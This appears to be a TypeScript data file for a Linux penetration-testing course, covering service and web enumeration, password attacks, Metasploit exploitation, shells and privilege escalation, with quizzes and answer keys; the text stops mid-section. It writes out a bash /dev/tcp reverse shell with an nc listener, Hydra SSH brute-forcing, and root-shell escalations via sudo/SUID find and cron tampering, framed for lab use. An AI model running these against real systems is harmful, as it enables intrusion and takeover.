import type { Level } from '../types'

const level: Level = {
  id: 'amateur',
  title: 'Enumeration, access and Linux privilege escalation',
  summary:
    'The working core of Linux testing: deep service and web enumeration, password attacks, exploiting known vulnerabilities, getting and stabilising shells, and the main Linux privilege-escalation paths — sudo, SUID/GTFOBins, cron and writable files, kernel and capabilities, and credential hunting. Practised only in your lab and on authorized targets.',
  outcomes: [
    'Enumerate services deeply and per-protocol',
    'Discover web content and virtual hosts',
    'Run password attacks and crack hashes responsibly',
    'Exploit known vulnerabilities and stabilise shells',
    'Escalate via sudo, SUID/GTFOBins, cron, writable files and PATH',
    'Escalate via kernel and capabilities, and hunt credentials',
  ],
  steps: [
    {
      id: 'rlin-a-01',
      title: 'Deep service enumeration',
      read: `The beginner level introduced Nmap; the amateur skill is **enumerating each discovered service deeply**, because the port scan is only the map — the value is in what you learn about each service afterward. This is where the "enumeration wins engagements" principle is put into practice.

## The pattern: scan, then dig into each service

A port scan gives you a list like "21 FTP, 22 SSH, 80 HTTP, 445 SMB, 3306 MySQL". For **each** one you now ask a battery of questions and use protocol-specific tools to answer them. The generic questions per service:

- **What exactly is it?** Software and precise version (\`nmap -sV\`).
- **Does it need authentication, and can that be bypassed or weak?** Anonymous access, default credentials, guessable credentials.
- **What does it reveal?** Banners, listings, error messages, configuration, users.
- **Does this version have known vulnerabilities?** (The CVE research from the beginner level.)
- **How is it configured?** Misconfigurations are as valuable as vulnerabilities.

## Nmap scripts (NSE)

Nmap's scripting engine automates much service enumeration. \`-sC\` runs the default safe scripts; category and named scripts go further:

- \`nmap --script=ftp-anon,ftp-syst -p21 <target>\` — checks for anonymous FTP and pulls system info.
- \`nmap --script=smb-enum-shares,smb-enum-users,smb-os-discovery -p445 <target>\` — enumerates SMB shares, users and OS.
- \`nmap --script=http-enum,http-title -p80 <target>\` — finds common web paths and the page title.
- \`nmap --script=vuln <target>\` — runs vulnerability-detection scripts (use judiciously; some are intrusive).

NSE scripts live in categories (\`safe\`, \`default\`, \`discovery\`, \`vuln\`, \`auth\`, \`brute\`) — knowing they exist and how to target a service saves enormous time.

## Beyond Nmap: dedicated tools

Each protocol has purpose-built enumeration tools that go deeper than Nmap: \`enum4linux\`/\`enum4linux-ng\` for SMB, \`smbclient\`/\`smbmap\` to browse shares, \`snmpwalk\` for SNMP, database clients for MySQL/PostgreSQL, and so on (the next step covers the important ones). The workflow is: Nmap finds and versions the service, then a dedicated tool enumerates it thoroughly.

## Record everything, follow every thread

Every finding — a username, a share name, a version, a directory, a banner revealing a hostname — goes into your notes and becomes a thread to pull. A username found via SMB is tried against SSH; a version found via a banner is researched for CVEs; a share reveals a config file with a password. Deep, per-service enumeration is the engine that produces the leads exploitation acts on — the difference between "80 is open" and "80 runs an old CMS with an admin panel and a known upload flaw."`,
      sample: {
        lang: 'bash',
        caption: 'Scan, then enumerate each service deeply with targeted scripts',
        code: `# targeted NSE scripts per discovered service (authorized target / lab)
nmap --script=ftp-anon -p21 10.10.10.5
nmap --script=smb-enum-shares,smb-enum-users -p445 10.10.10.5
nmap --script=http-enum,http-title -p80 10.10.10.5`,
        output: `21/tcp  ftp-anon: Anonymous FTP login allowed (FTP code 230)  <- in!
        | drwxr-xr-x  backup  1024  config.tar.gz
445/tcp smb-enum-shares:  \\\\10.10.10.5\\backups  (READ)  <- browse it
        smb-enum-users:   jsmith, admin, svc-web        <- usernames!
80/tcp  http-title: "ACME Intranet - Login"
        http-enum: /admin/ /uploads/ /backup.zip        <- dig into these
# Each line is a thread: anon FTP file, a readable share, usernames
# to reuse, web paths to explore. THIS is where leads come from.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'After a port scan reveals several open services, why is per-service enumeration (with targeted scripts and protocol-specific tools) the critical next step?',
        options: [
          'Because the port scan already exploited them',
          'Because the scan only maps which services exist; the leads that enable exploitation — anonymous access, usernames, shares, web paths, versions, misconfigurations — come from digging into each service deeply, so thorough per-service enumeration is what turns an open port into an actionable way in',
          'Because services must be enumerated before they can be closed',
          'Because enumeration makes the scan run faster',
        ],
        answer: 1,
        explain:
          'A port scan tells you a service is listening; it does not tell you the anonymous FTP login it allows, the usernames it leaks, the readable share it exposes, the admin panel and upload path on its web root, or the exact version with a known flaw. Those are the leads exploitation needs, and they only appear when you enumerate each service deeply with the right scripts and dedicated tools. This is the concrete practice of "enumeration wins engagements": the more completely you interrogate each service, the more attack surface — and the more ways in — you uncover.',
        hint: 'Does an open port tell you the usernames, shares and versions behind it, or does digging in do that?',
      },
    },

    {
      id: 'rlin-a-02',
      title: 'Enumerating common services',
      read: `Each common service has its own enumeration approach. Knowing the questions and tools for the services you meet constantly is core amateur knowledge. (Always on authorized targets or your lab.)

## FTP (21)

- **Anonymous login** — try \`ftp <target>\` with username \`anonymous\`; a surprising number allow it, exposing files.
- **Version** — old FTP daemons have known vulnerabilities (the vsftpd backdoor).
- Browse and download everything readable; configs and backups are common finds.

## SSH (22)

- **Version** — reveals the OS/distro and any known SSH flaws.
- **Authentication methods** — password vs key-only. If password auth is on, it's a target for credential attacks (next step).
- Usernames found elsewhere are tried here; SSH is a prime reuse target.

## SMB / Windows file sharing (139/445)

Rich on both Linux (Samba) and Windows:

- \`enum4linux-ng <target>\` — the workhorse: users, groups, shares, OS, password policy.
- \`smbclient -L //<target>\` — list shares; \`smbclient //<target>/share\` — browse one (try anonymous/null sessions).
- \`smbmap -H <target>\` — shows share permissions (which are readable/writable).
- Shares frequently contain configs, backups, credentials, and scripts.

## HTTP/HTTPS (80/443/8080/…)

The largest surface — the next step covers web enumeration in depth. Initial checks: the technology and version (Wappalyzer, \`whatweb\`), the page and its source, \`robots.txt\`, and obvious paths.

## Databases (MySQL 3306, PostgreSQL 5432, MongoDB 27017, Redis 6379)

- Try **default/no credentials** — an exposed database with no password (Redis and MongoDB historically ship open) is an immediate win, and even authenticated ones may use weak passwords.
- Once in, enumerate databases, tables, and — especially — **credentials tables** (application users, hashes to crack).

## SNMP (161/UDP)

Often overlooked (it's UDP), and a goldmine: with a guessable **community string** (\`public\` is a common default), \`snmpwalk\` can dump running processes, installed software, network config, and sometimes credentials.

## Mail (25/110/143), NFS (2049), and more

- **NFS** — \`showmount -e <target>\` lists exported shares you might mount and read/write.
- **SMTP** — user enumeration via VRFY/RCPT commands.

## The unifying method

For every service: identify it precisely, try anonymous/default/weak access, enumerate what it exposes (users, shares, data, config), research its version, and record every finding as a thread. The services above cover most of what you'll meet; the deeper skill is the *habit* of interrogating each one fully rather than glancing at the port list.`,
      sample: {
        lang: 'bash',
        caption: 'Protocol-specific enumeration of a few common services',
        code: `# SMB: users, shares, permissions
enum4linux-ng 10.10.10.5
smbmap -H 10.10.10.5

# FTP: try anonymous
ftp 10.10.10.5        # user: anonymous, pass: anything

# SNMP: try a default community string (UDP, often forgotten)
snmpwalk -v2c -c public 10.10.10.5 | head

# NFS: what's exported?
showmount -e 10.10.10.5`,
        output: `[SMB] Users: jsmith, admin, svc-backup
      Shares: backups (READ), transfer (READ,WRITE)  <- writable!
[FTP] 230 Anonymous access granted   -> config.tar.gz downloaded
[SNMP] hrSWRunName: /usr/bin/mysqld ... nsExtendOutput: db_pass=... <- creds!
[NFS] /srv/share *(rw)   -> mountable, world read/write
# Every service interrogated fully - each line a thread to follow.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why is SNMP (UDP port 161) with a default community string like "public" often described as a goldmine that testers must not overlook?',
        options: [
          'Because SNMP grants root access directly',
          'Because with a guessable community string, snmpwalk can dump extensive system information — running processes, installed software, network configuration and sometimes credentials — and because it is UDP it is easily missed by TCP-focused scans, so it is both high-value and frequently overlooked',
          'Because SNMP is the only service worth enumerating',
          'Because SNMP cannot be secured',
        ],
        answer: 1,
        explain:
          'SNMP is designed to expose management information, so an accessible agent — reachable with a default or guessable community string such as `public` — can be walked to reveal running processes, installed software, network and interface configuration, user accounts, and occasionally credentials in extended output. It is doubly valuable to a tester because it runs over UDP and is therefore missed by default TCP scans and by anyone who only glances at the TCP port list, making it a rich source of leads that careless enumeration skips entirely. The defensive lesson is to disable it if unused, restrict it, and never leave default community strings.',
        hint: 'What kind of information is SNMP built to expose, and why do TCP-focused scans miss it?',
      },
    },

    {
      id: 'rlin-a-03',
      title: 'Web content discovery',
      read: `Web applications are usually the largest attack surface, and much of it is **not linked from anywhere** — admin panels, backup files, API endpoints, old pages, config files. **Content discovery** finds these hidden paths, and it is one of the highest-yield enumeration activities against a web target.

## Directory and file brute-forcing

The core technique: request many candidate paths from a wordlist and keep the ones that exist (by HTTP status — 200, 301/302, 403 all indicate something is there, versus 404). Tools:

- **ffuf**, **gobuster**, **feroxbuster**, **dirb/dirbuster** — fast fuzzers that take a wordlist and a target.
- \`ffuf -u http://target/FUZZ -w wordlist.txt\` — \`FUZZ\` marks where each word is inserted.

You look for: admin interfaces (\`/admin\`, \`/manage\`), backups (\`/backup.zip\`, \`.bak\`, \`.old\`, \`.swp\`), config and secret files (\`.env\`, \`config.php\`, \`.git/\`), API paths (\`/api\`, \`/v1\`), upload directories, and dev/test pages.

## Wordlists matter

Content discovery is only as good as its wordlist. **SecLists** is the standard collection — curated lists of common directories, files, parameters and more. Use a general list first, then targeted lists (technology-specific, extension-specific). Include relevant **file extensions** for the stack (\`-x php,txt,bak\` for a PHP app) so you find files, not just directories.

## Recursion and virtual hosts

- **Recurse** into directories you find — \`/admin\` may contain \`/admin/backup\`, and so on.
- **Virtual hosts (vhosts)** — one IP can serve many sites by the \`Host\` header. Fuzz the \`Host\` header (\`ffuf -H "Host: FUZZ.target.com" ...\`) to discover subdomains/vhosts not in DNS — a frequent way to find hidden applications (\`dev.\`, \`admin.\`, \`internal.\`) on the same server.

## Beyond brute-forcing

- **robots.txt and sitemap.xml** — often list paths the owner didn't want indexed (which is exactly where interesting things are).
- **Source code and comments** — HTML/JS source reveals endpoints, API URLs, hidden parameters, and sometimes credentials or keys.
- **JavaScript analysis** — modern apps' JS files reference API endpoints and parameters; reading them (or tools that extract URLs from JS) maps the real application surface.
- **Spidering/crawling** — tools (Burp, ZAP) crawl linked content to build the site map, complementing brute-forcing of the unlinked.

## The mindset, on the web

Content discovery is the enumeration mindset applied to the web: assume there is more than what's linked, and go find it. The unlinked admin panel, the forgotten backup, the exposed \`.git\` directory (which can leak the entire source code), the API endpoint referenced only in JavaScript — these are where footholds are found, and none of them appear if you only click around the visible site. Thorough content discovery, with good wordlists and attention to source and vhosts, is what turns a web target's hidden surface into a list of things to test.`,
      sample: {
        lang: 'bash',
        caption: 'Finding the unlinked surface: directories, files, and vhosts',
        code: `# directories and files, with extensions relevant to the stack
ffuf -u http://10.10.10.5/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php,.bak,.zip,.txt

# virtual hosts on the same IP (Host-header fuzzing)
ffuf -u http://10.10.10.5/ -H "Host: FUZZ.acme.local" -w subdomains.txt -fs 1234`,
        output: `/admin                 [Status: 301]      <- admin panel
/backup.zip            [Status: 200]      <- a backup, download it
/.git                  [Status: 301]      <- source code leak!
/config.php.bak        [Status: 200]      <- config with credentials?
/api                   [Status: 301]
[vhost] dev            [Status: 200]      <- dev.acme.local: hidden app
# None of these were LINKED from the site. Content discovery found
# the real attack surface the visible pages never showed.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why is web content discovery (directory/file brute-forcing, vhost fuzzing, reading source) such a high-yield technique, beyond just browsing the visible site?',
        options: [
          'Because it exploits the web server directly',
          'Because much of a web app’s attack surface is not linked from any visible page — admin panels, backup and config files, exposed .git directories, API endpoints, hidden vhosts — so it is invisible to normal browsing and only content discovery reveals it, and those hidden resources are frequently where footholds are found',
          'Because browsing the site is not allowed during a test',
          'Because content discovery is faster than a port scan',
        ],
        answer: 1,
        explain:
          'The pages a user can click to are only part of a web application. Admin interfaces, leftover backups, configuration files, an exposed `.git` directory that can leak the whole source, API endpoints referenced only in JavaScript, and virtual hosts sharing the same IP are typically unlinked and therefore invisible to ordinary browsing — yet they are exactly where sensitive functionality and footholds live. Brute-forcing paths and vhosts with good wordlists, plus reading source and robots.txt, surfaces this hidden attack surface, which is why it is one of the most productive things to do against a web target.',
        hint: 'Is the admin panel or the forgotten backup usually linked from the home page?',
      },
    },

    {
      id: 'rlin-a-04',
      title: 'Password attacks',
      read: `Weak and reused credentials are among the most common ways into real systems, so **password attacks** are a core offensive skill — used, as always, only against authorized targets and in your lab.

## Online vs offline attacks

- **Online** — guessing credentials against a *live service* (SSH, a web login, FTP, RDP). Limited by network speed, lockouts and rate limiting, and **noisy** (every attempt is logged — the failed-login floods you learned to detect defensively). Tools: **Hydra**, **Medusa**, **Ncrack**, and for web, tools like Burp Intruder or \`ffuf\`.
- **Offline** — cracking **captured password hashes** (from a database dump, a leaked file, \`/etc/shadow\` after a foothold). No network, no lockout, no logging — you compute guesses as fast as your hardware allows. Tools: **Hashcat** (GPU-accelerated) and **John the Ripper**.

## The attack types

- **Dictionary/wordlist** — try passwords from a list of likely candidates. The overwhelmingly most effective approach, because people choose predictable passwords. The classic wordlist is **rockyou.txt** (from a real breach); SecLists has many more.
- **Rule-based** — apply transformations to wordlist entries (capitalise, append numbers/years, \`s→$\`) to match how people modify passwords — hugely increases coverage for little cost.
- **Brute-force** — try all combinations. Only feasible for short/simple passwords; usually a last resort.
- **Credential stuffing / password spraying** — using *known* credentials (from breaches) or trying *one* common password across *many* accounts (spraying avoids per-account lockout — the technique defenders watch for).

## Cracking hashes

To crack a hash you must **identify the algorithm** (MD5, SHA-1, bcrypt, NTLM…) — tools like \`hashid\`/\`hash-identifier\` help — then run the right mode. Crucially, this connects to the defensive lesson: **fast hashes (MD5, SHA-1, unsalted) crack quickly; slow salted hashes (bcrypt, Argon2) are impractical to crack**. When you dump hashes on an authorized test and they're MD5, you'll crack the weak ones fast — which is precisely why the defensive tracks insisted on bcrypt/Argon2. The crackability of the hashes is itself a finding.

## Where credentials come from

Password attacks are most effective combined with enumeration: usernames gathered from SMB/SMTP/web feed the guess list; a leaked breach password (passive recon) is tried for reuse; a hash found in a config or database is cracked offline. Credentials are a currency that flows through an engagement — found in one place, cracked or reused in another.

## The defensive mirror

Everything here is why the defensive advice was strong passwords, MFA, rate limiting, lockout, and slow salted hashing. When you spray a common password and it works, or crack an MD5 dump in seconds, you are demonstrating exactly the risk those controls address. Offensive password attacks and defensive credential hardening are two views of the same problem.`,
      sample: {
        lang: 'bash',
        caption: 'Online guessing vs. offline cracking (authorized/lab only)',
        code: `# ONLINE: guess SSH creds for a known user (noisy, logged, may lock out)
hydra -l jsmith -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.5

# OFFLINE: crack hashes dumped from an authorized target (fast, quiet)
hashid hashes.txt                     # identify the algorithm first
hashcat -m 0 hashes.txt rockyou.txt   # -m 0 = MD5 (fast -> weak ones fall)
# (bcrypt would be -m 3200 and vastly slower - often impractical)`,
        output: `[ONLINE]  [22][ssh] host: 10.10.10.5  login: jsmith  password: Summer2024
          -> but 200 failed attempts were logged first (loud!)
[OFFLINE] 5f4dcc3b5aa765d61d8327deb882cf99:password   (MD5 cracked instantly)
          8a9f...:Winter2023!                          (rule appended a year)
# MD5 falls in seconds; a bcrypt dump would resist for ages - exactly
# why defenders MUST use slow salted hashing. The hash type is a finding.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'What is the key advantage of an offline hash-cracking attack over an online password-guessing attack?',
        options: [
          'Offline attacks work on any password instantly',
          'Offline cracking works against captured hashes with no network involved, so it is not limited by network speed, account lockouts or rate limiting, is not logged on the target, and can run at full hardware speed — whereas online guessing is slow, noisy (every attempt is logged) and subject to lockout',
          'Online attacks cannot crack real passwords',
          'Offline attacks never require a wordlist',
        ],
        answer: 1,
        explain:
          'Online attacks interact with a live service, so they are throttled by the network, generate logged failed-login events (the floods defenders detect), and can trigger account lockout — all of which sharply limit them. Offline attacks operate on hashes the tester has already captured, entirely off the target: no network round-trips, no lockout, nothing logged on the victim, and guessing runs as fast as the (often GPU-accelerated) hardware allows. This is also why the hash algorithm matters so much — fast hashes fall quickly offline while slow salted ones (bcrypt/Argon2) resist — which is exactly the defensive rationale for using them.',
        hint: 'What limits and exposes online guessing that simply does not apply once you have the hashes locally?',
      },
    },

    {
      id: 'rlin-a-05',
      title: 'Exploiting known vulnerabilities',
      read: `With enumeration done and leads researched, **exploitation** uses a confirmed weakness to gain access. For a foothold, this most often means a **known vulnerability** in a service or application — and doing it well is about understanding and reliability, not just running a script.

## The workflow

1. **Confirm the vulnerability applies** — from version research (the beginner level), verify the target really is the vulnerable version and configuration, not a patched build with the same version string. Where safe, use a non-destructive check first.
2. **Obtain the exploit** — a Metasploit module, an Exploit-DB proof-of-concept, or a documented technique.
3. **Understand it** — read what it does, what conditions it needs, and what the payload will be. Never run an unread exploit (it may be unreliable, destructive, or malicious).
4. **Configure it** — set the target, the options, and the **payload** (often a reverse shell back to your listener).
5. **Run it, and have a listener ready** — catch the resulting shell.
6. **Verify and stabilise** — confirm access, note who you are, stabilise the shell (next step).

## Metasploit

The standard framework, worth real fluency:

- **Search and select** — \`search <software/CVE>\`, then \`use <module>\`.
- **Configure** — \`show options\`, then \`set RHOSTS\`, \`set LHOST\` (your IP), \`set PAYLOAD\`.
- **Run** — \`exploit\` (or \`run\`). \`check\` (where supported) tests applicability without exploiting.
- **Payloads and Meterpreter** — Metasploit's **Meterpreter** payload is a feature-rich in-memory shell (file access, pivoting, post modules). Understand it rather than treating it as magic.

Metasploit is superb for learning and for reliable exploitation of known flaws, but professionals also value **manual** exploitation (adapting a PoC, chaining app flaws) because real targets often don't match a canned module, and because understanding beats dependence.

## Payloads: matching the target

An exploit is the delivery; the **payload** is what runs. You match the payload to the target (OS, architecture) and the network (a reverse shell to escape outbound firewalls, or a bind shell if you can reach a listening port). **msfvenom** generates standalone payloads (a reverse shell in various formats) for use outside Metasploit — useful when you have code execution via a different vector (an upload, a command injection).

## Reliability and safety

Some exploits are reliable; some can crash the service (a memory-corruption exploit that fails may take the process down). On an authorized engagement you weigh this against the rules of engagement — a crash may disrupt a production service, so you assess risk and sometimes choose a safer route. In your lab, snapshot first and experiment freely.

## The point is the foothold, understood

Exploitation lands you a foothold — usually low-privileged — and the skill that matters is doing it with **understanding**: knowing why it works, what the payload is, and what you now have. That understanding is what lets you adapt when the canned module doesn't fit, and it is what you'll write up (and what a defender needs to hear) in the report.`,
      sample: {
        lang: 'text',
        caption: 'A Metasploit exploitation workflow (against an authorized target)',
        code: `msf6 > search vsftpd 2.3.4
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > set RHOSTS 10.10.10.5
msf6 > set LHOST 10.10.10.9         # your attacker IP
msf6 > check                        # confirm applicability where supported
msf6 > exploit
[*] 10.10.10.5:21 - Banner: 220 (vsFTPd 2.3.4)
[+] Backdoor service has been spawned...
[*] Command shell session 1 opened
$ id
uid=0(root)                          # this particular flaw yields root;
                                     # most footholds are LOW-priv, then escalate.`,
        output: `Workflow: confirm the vuln applies -> obtain and UNDERSTAND the
exploit -> configure target + payload (often a reverse shell) ->
run with a listener ready -> verify + stabilise. Metasploit is
great for known flaws; manual skill matters when targets don't
fit a module. Understand what the payload does - don't run blind.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Before running an exploit (from Metasploit or Exploit-DB), why is it important to read and understand it rather than just launching it?',
        options: [
          'Because reading it makes the exploit run faster',
          'Because a public exploit may be unreliable, may crash the target service, may require conditions the target does not meet, or may be malicious/backdoored — and understanding what it does (and its payload) lets you assess risk, adapt it when it does not fit, and explain it in the report',
          'Because exploits only work if you can recite them',
          'Because it is illegal to run an exploit you have read',
        ],
        answer: 1,
        explain:
          'An exploit is code that will run with the intent of altering a target’s behaviour, and public proof-of-concept code is frequently unreliable, sometimes destructive (a failed memory-corruption exploit can crash the service, disrupting a production system on an authorized test), often dependent on conditions your target may not meet, and occasionally deliberately backdoored to compromise the person running it. Reading it lets you judge whether it applies and what risk it carries, adapt it when the canned version does not fit the real target, and understand the payload well enough to write the finding up — the comprehension that separates professional exploitation from blindly firing scripts.',
        hint: 'What could unread exploit code do to the target — or to you — and what does understanding it enable?',
      },
    },

    {
      id: 'rlin-a-06',
      title: 'Shells: getting and keeping them',
      read: `Exploitation gives you code execution, but turning that into a **usable, stable shell** is a practical skill worth mastering, because an initial shell is often limited, fragile, and frustrating to work in.

## Reverse vs bind shells

- **Reverse shell** — the target connects *out* to your listener (the beginner-level pattern). Preferred, because outbound traffic escapes firewalls more easily. You run \`nc -lvnp 4444\`; the target runs a reverse-shell command connecting back.
- **Bind shell** — the target *listens* and you connect *in*. Works only if you can reach the listening port (often blocked inbound), so used less, but useful in some network positions.

## Common reverse-shell one-liners

When you have command execution (via an exploit, an injection, an upload), you trigger a connection back. The classic Bash form:

\`\`\`
bash -i >& /dev/tcp/<your-ip>/4444 0>&1
\`\`\`

and there are equivalents in Python, Perl, PHP, Netcat, and more — because whichever interpreter is present on the target, one of them usually works. Reference collections (PayloadsAllTheThings, revshells.com) list them; the skill is picking one that fits what the target has.

## Why an initial shell is painful

A raw reverse shell is usually a "dumb" shell: **no job control** (Ctrl-C kills the whole shell), **no tab-completion**, **no command history**, **no arrow keys**, garbled output, and it breaks on interactive programs (\`ssh\`, \`su\`, text editors). You *can* run commands, but working in it is awkward and error-prone.

## Stabilising to a full TTY

The standard upgrade turns it into a proper interactive terminal:

1. Spawn a PTY, commonly with Python: \`python3 -c 'import pty; pty.spawn("/bin/bash")'\`.
2. Background it (Ctrl-Z), then on your side \`stty raw -echo; fg\` to fix terminal handling, and set \`export TERM=xterm\`.

Now you have job control, tab-completion, history and working interactive programs — a shell you can actually operate. (\`socat\` can also deliver a fully interactive shell directly if it's available on both ends.)

## Upgrading to something better

Beyond stabilising, testers often upgrade to a more capable channel: a **Meterpreter** session (if via Metasploit) for its file, network and post-exploitation features, or — very commonly — **using found credentials to log in via SSH**, which gives a clean, stable, reliable shell far nicer than any reverse shell. Turning a shaky foothold into a solid SSH session (once you have creds) is a frequent early move.

## Why this matters

You'll spend most of an engagement *in* a shell — enumerating for privilege escalation, moving around, gathering data. A fragile shell that dies when you press Ctrl-C or run \`sudo\` wastes time and loses footholds. Knowing how to get a shell, catch it, stabilise it, and upgrade it is unglamorous but constant work, and it's the difference between fighting your tools and working effectively once you're in.`,
      sample: {
        lang: 'bash',
        caption: 'Catch a reverse shell, then stabilise it into a real TTY',
        code: `# attacker: listener
nc -lvnp 4444

# target (via exploit/injection/upload): connect back
bash -i >& /dev/tcp/10.10.10.9/4444 0>&1

# in the caught shell, upgrade the dumb shell to a full TTY:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z  (background it), then on the attacker:
stty raw -echo; fg
# back in the shell:
export TERM=xterm`,
        output: `connect to [10.10.10.9] from (UNKNOWN) [10.10.10.5] 51022
www-data@target:/$        # dumb shell: Ctrl-C kills it, no tab-complete
...after upgrade...
www-data@target:/$        # full TTY: job control, history, tab-complete,
                          # and interactive programs (su/ssh/editors) work
# Better still, once you have creds: ssh user@target -> a clean, stable shell.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why do testers "stabilise" an initial reverse shell into a full interactive TTY rather than working in the raw shell?',
        options: [
          'To make the shell run as root',
          'A raw reverse shell lacks job control, tab-completion, history and proper terminal handling and breaks on interactive programs like su, ssh and editors — so stabilising it into a full TTY makes the shell reliable and usable for the extensive work (enumeration, escalation, movement) done from within it',
          'Because raw shells are illegal to use',
          'Because stabilising encrypts the connection',
        ],
        answer: 1,
        explain:
          'An initial reverse shell is typically a "dumb" shell: pressing Ctrl-C kills it entirely, there is no tab-completion or command history, the arrow keys and terminal handling are broken, and interactive programs (`su`, `ssh`, text editors) fail. Since a tester spends most of an engagement operating inside the shell — enumerating for privilege escalation, moving around, gathering data — that fragility wastes time and risks losing the foothold. Upgrading to a full PTY restores job control, completion, history and interactive-program support, and where credentials are available, logging in over SSH gives an even cleaner, more stable session.',
        hint: 'What happens in a raw shell when you press Ctrl-C or try to run `su` — and how much of an engagement is spent in the shell?',
      },
    },

    {
      id: 'rlin-a-07',
      title: 'Privilege escalation: sudo and SUID',
      read: `You have a low-privileged shell; now escalate to root. The two most common and productive Linux escalation paths are **sudo misconfigurations** and **SUID binaries** — both about a program running with more privilege than the user who invokes it, abused to get a root shell.

## sudo misconfigurations

\`sudo -l\` lists what the current user may run as root (often without a password, \`NOPASSWD\`). The escalation: if any allowed program can be made to **execute an arbitrary command or spawn a shell**, you inherit root.

- Interactive programs that can "shell out" are the classic route: \`sudo vim\` → \`:!sh\`; \`sudo less\`/\`man\` → \`!sh\`; \`sudo find . -exec /bin/sh \\;\`; \`sudo awk 'BEGIN{system("/bin/sh")}'\`; \`sudo nmap --interactive\` (older versions).
- Even programs that don't obviously spawn shells often can (via a plugin, a config option, an environment variable, or writing to a file root reads).

## SUID/SGID binaries

A **SUID** binary runs with the privileges of its **owner** (often root), regardless of who launches it — the \`s\` in \`ls -l\` (\`-rwsr-xr-x\`). Legitimate ones exist (\`passwd\` needs to edit \`/etc/shadow\`), but a SUID binary that can run commands, read/write arbitrary files, or spawn a shell hands you its owner's privileges.

Hunt them: \`find / -perm -4000 -type f 2>/dev/null\`. Then check each against **GTFOBins**.

## GTFOBins: the key resource

**GTFOBins** is a catalogue of standard Unix binaries and how each can be abused when it's SUID, or runnable via sudo, or has a capability — to break out to a shell, read/write files, or escalate. When your SUID hunt or \`sudo -l\` turns up a binary, you look it up in GTFOBins for the exact technique. It's the reference that turns "this binary is SUID/sudo-able" into "here's how to get root from it."

For example, GTFOBins shows that a SUID \`find\` gives root via \`find . -exec /bin/sh -p \\; -quit\` (the \`-p\` preserves privileges), that \`cp\` can overwrite \`/etc/passwd\`, that \`vim\` can spawn a shell, and so on for dozens of binaries.

## The method

1. \`sudo -l\` — what can I run as root? Check each entry against GTFOBins.
2. \`find / -perm -4000 -type f 2>/dev/null\` — what's SUID? Check each against GTFOBins.
3. For any hit, apply the GTFOBins technique to get a root shell.
4. Understand *why* it works — the binary's legitimate function being abused — so you can explain it (and, defensively, remove it).

## The defensive mirror (again)

This is exactly what the defensive Linux track taught defenders to find and remove: the SUID hunt and \`sudo -l\` audit are identical on both sides. When you exploit a SUID \`find\`, you are demonstrating precisely the finding a defender should have caught. GTFOBins is as much a defensive checklist ("don't make these SUID or sudo-able") as an offensive one — the same knowledge, two directions.`,
      sample: {
        lang: 'bash',
        caption: 'Two classic escalations, via sudo and SUID (GTFOBins techniques)',
        code: `# 1. what can I run as root?
sudo -l
#   User www-data may run: (root) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \\; -quit        # GTFOBins: find -> root shell

# 2. what is SUID?
find / -perm -4000 -type f 2>/dev/null
#   /usr/bin/find   <- also SUID here
find . -exec /bin/sh -p \\; -quit          # -p preserves the SUID privilege`,
        output: `# id
uid=0(root) gid=0(root) groups=0(root)
# Root via a program that can execute commands - abusing sudo OR the
# SUID bit. GTFOBins lists the exact technique for each such binary.
# This is EXACTLY the finding the defensive track said to remove:
# don't make shell-capable binaries SUID or NOPASSWD-sudo-able.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'What is GTFOBins, and why is it central to Linux privilege escalation (and to defending against it)?',
        options: [
          'A collection of kernel exploits',
          'A catalogue of standard Unix binaries and the exact techniques to abuse each one — when it is SUID, runnable via sudo, or has a capability — to spawn a shell or read/write files as a higher-privileged owner; testers look up the binaries they find, and defenders use the same list to know which binaries must never be SUID or sudo-able',
          'A password-cracking wordlist',
          'A tool that automatically roots any Linux system',
        ],
        answer: 1,
        explain:
          'GTFOBins documents, per binary, how a legitimate Unix program can be turned against the system when it runs with elevated privilege — via the SUID bit, a sudo entry, or a Linux capability — to break out to a shell, execute commands, or read/write files as its owner (often root). For a tester, it converts a `sudo -l` entry or a SUID hunt result into a concrete escalation technique; for a defender, it is a checklist of exactly which binaries must not be made SUID or granted via sudo. The same reference serves both sides, which is why the offensive escalation and the defensive finding are mirror images.',
        hint: 'It tells you how to abuse a specific everyday binary that has extra privilege — and, read the other way, which binaries to never grant it to.',
      },
    },

    {
      id: 'rlin-a-08',
      title: 'Privilege escalation: cron, writable files and PATH',
      read: `Beyond sudo and SUID, a rich category of Linux escalation comes from **root running something the low-privileged user can influence** — a scheduled job, a script, a file, or a lookup that the user can tamper with. Finding these is enumeration; exploiting them is turning root's own actions against it.

## Cron jobs

Root often runs scheduled tasks (cron). If a script that root runs is **writable by you**, you edit it to run your command as root when the job fires. Check:

- \`cat /etc/crontab\`, \`ls -la /etc/cron.*\`, and any scripts they reference.
- The permissions of every script a root cron job runs — a world-writable or group-writable script that root executes is an immediate escalation: add \`chmod u+s /bin/bash\` or a reverse shell, wait for the job, become root.
- \`pspy\` (a tool that shows processes and cron jobs without root) reveals scheduled tasks and short-lived processes you'd otherwise miss.

## Writable files root uses

The same principle beyond cron:

- A **writable service file** (systemd unit) that runs as root — modify it, restart the service (or wait), get root.
- A **writable config** that root reads and acts on.
- **Writable \`/etc/passwd\`** — if you can write it, add a root user with a known password (or a UID-0 entry), and you *are* root. (\`/etc/passwd\` accepting a password hash directly is a classic.)
- Any file owned by root but writable by your user or group is a potential path — enumerate for them: \`find / -writable -type f 2>/dev/null\` (filter the noise).

## PATH hijacking

If root runs a script (via cron, sudo, or a SUID wrapper) that calls a program **without an absolute path** (e.g. just \`backup\` instead of \`/usr/bin/backup\`, or a common command like \`tar\`), and you can control the **PATH** or write to a directory that appears earlier in it, you place a malicious program of that name earlier in the PATH. When root's script runs, it executes *your* program instead. This is why the defensive track flagged scripts calling binaries by bare name and writable PATH directories.

## Wildcard injection

